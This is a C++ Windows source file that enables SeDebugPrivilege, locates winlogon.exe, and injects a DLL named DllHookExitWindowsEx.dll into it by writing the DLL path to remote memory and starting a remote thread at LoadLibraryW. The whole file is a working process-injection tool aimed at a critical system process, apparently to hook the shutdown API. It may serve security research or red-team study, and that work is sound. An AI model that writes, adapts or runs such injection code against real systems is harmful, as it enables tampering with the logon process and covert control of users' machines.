#include <Windows.h>
#include <Psapi.h>
#include <Tlhelp32.h>
#include <sddl.h>
#include <Shlwapi.h>
#include <cstdio>

#pragma comment (lib,"advapi32.lib")
#pragma comment (lib,"Shlwapi.lib")


void EnableSeDebugPrivilegePrivilege() {
	LUID luid;
	HANDLE currentProc = OpenProcess(PROCESS_ALL_ACCESS, false, GetCurrentProcessId());
	if (currentProc) {
		HANDLE TokenHandle = NULL;
		BOOL hProcessToken = OpenProcessToken(currentProc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &TokenHandle);
		if (hProcessToken) {
			BOOL checkToken = LookupPrivilegeValue(NULL, L"SeDebugPrivilege", &luid);

			if (!checkToken) {
				puts("[+] Current process token already includes SeDebugPrivilege\n");
			} else {
				TOKEN_PRIVILEGES tokenPrivs;

				tokenPrivs.PrivilegeCount = 1;
				tokenPrivs.Privileges[0].Luid = luid;
				tokenPrivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

				BOOL adjustToken = AdjustTokenPrivileges(TokenHandle, FALSE, &tokenPrivs, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL);

				if (adjustToken != 0) {
					puts("[+] Added SeDebugPrivilege to the current process token");
				}
			}
			CloseHandle(TokenHandle);
		}
		CloseHandle(currentProc);
	}
}

void InjectToWinLogon() {
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

    if (snapshot == INVALID_HANDLE_VALUE) {
        puts("[-] Failed to create snapshot of processes.");
        return;
    }

    INT pid = -1;
    if (Process32First(snapshot, &entry)) {
        while (Process32Next(snapshot, &entry)) {
            if (wcscmp(entry.szExeFile, L"winlogon.exe") == 0) {
                pid = entry.th32ProcessID;
                break;
            }
        }
    }

    CloseHandle(snapshot);

    if (pid < 0) {
        puts("[-] Could not find winlogon.exe");
        return;
    }

    HANDLE proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

    if (proc == NULL) {
        DWORD error = GetLastError();
        puts("[-] Failed to open process.");
        printf("Error: %lu\n", error);
        return;
    }

    TCHAR buffDll[MAX_PATH] = { 0 };
    GetModuleFileName(NULL, buffDll, _countof(buffDll));
    PathRemoveFileSpec(buffDll);
    wcscat_s(buffDll, _countof(buffDll), L"\\DllHookExitWindowsEx.dll");

    LPVOID buffer = VirtualAllocEx(proc, NULL, sizeof(buffDll), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    if (buffer == NULL) {
        puts("[-] Failed to allocate remote memory");
        return;
    }

    if (!WriteProcessMemory(proc, buffer, buffDll, sizeof(buffDll), 0)) {
        puts("[-] Failed to write to remote memory");
        return;
    }

    LPTHREAD_START_ROUTINE start = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(L"Kernel32.dll"), "LoadLibraryW");

    HANDLE hthread = CreateRemoteThread(proc, 0, 0, start, buffer, 0, 0);

    if (hthread == NULL) {
        DWORD error = GetLastError();
        puts("[-] Failed to create remote thread.");
        printf("Error: %lu\n", error);
        return;
    }
}

int main(int argc, char* argv[]) {
	EnableSeDebugPrivilegePrivilege();
	InjectToWinLogon();
	puts("Injection finished!");
	Sleep(2000);
	return 0;
}
